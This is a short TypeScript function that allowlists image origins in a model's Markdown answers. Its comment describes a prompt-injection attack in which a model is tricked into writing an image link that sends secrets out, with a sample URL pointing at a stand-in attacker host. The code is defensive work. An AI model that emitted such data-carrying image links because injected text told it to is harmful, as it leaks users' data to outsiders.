/**
 * Whether a Markdown image may be loaded. A model that has read untrusted text can be tricked into writing an image whose address
 * carries data out (https://attacker.example/pixel.png?secret=...), and the browser would fetch it just by showing the answer. So an
 * answer's pictures load only from the origins we expect: an absolute http(s) address on one of `origins`.
 */
export const isAllowedImage = (src: string | undefined, origins: string[]): boolean => {
    if (!src) return false
    try {
        const url = new URL(src)
        return (url.protocol === "https:" || url.protocol === "http:") && origins.includes(url.origin)
    } catch {
        return false
    }
}
